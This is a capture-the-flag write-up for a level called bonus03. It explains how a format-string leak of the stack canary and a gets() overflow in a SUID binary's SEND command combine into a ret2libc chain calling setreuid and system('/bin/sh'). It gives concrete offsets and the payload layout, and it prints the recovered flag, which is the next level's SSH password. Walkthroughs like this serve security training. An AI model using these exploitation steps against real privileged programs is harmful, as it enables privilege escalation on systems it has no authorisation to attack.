# bonus03 — walkthrough

**Binary:** `/home/bonus03/sendai` (SUID `flagbonus03`) — **no source**
**Goal:** read `/home/flagbonus03/.pass`

## Recon
```
PIE (ASLR off), NX, canary. info_leak() prints the PIE base (disconnect@binary).
main -> handle_command(): loops reading commands (CONNECT/SEND/DISCONNECT/QUIT).
No setreuid in main -> chain must setreuid.
```

## Bugs — both in `SEND:<n>`
After `CONNECT:<n>` marks a connection active, `SEND:<n>` does:
```c
gets(buf@rbp-0x90);   // gets() OVERFLOW  (buf[0x88] = canary -> offset 136)
printf(buf);          // FORMAT STRING    (leaks the canary at %33$)
```
The command loop lets us use one `SEND` to leak and another to overflow.

## Exploit
1. `CONNECT:0`.
2. `SEND:0` + `%33$p` → leak the canary. (`printf(buf)` stops at the canary's
   NUL byte, so a following overflow's binary bytes are harmless.)
3. `SEND:0` + `['A'*136][canary]['A'*8][ret2libc]` → overflow.
4. `QUIT` → `handle_command` returns → canary passes → chain runs.
5. chain: `setreuid(1030,1030)` + `system("/bin/sh")` (movaps-aligned).

## Run
```
python3 exploit.py   ->   mrc2jp0jsvklrfhjsh5uuwmk26yzyxgq
```

**flagbonus03 = `mrc2jp0jsvklrfhjsh5uuwmk26yzyxgq`** (SSH password for bonus04)
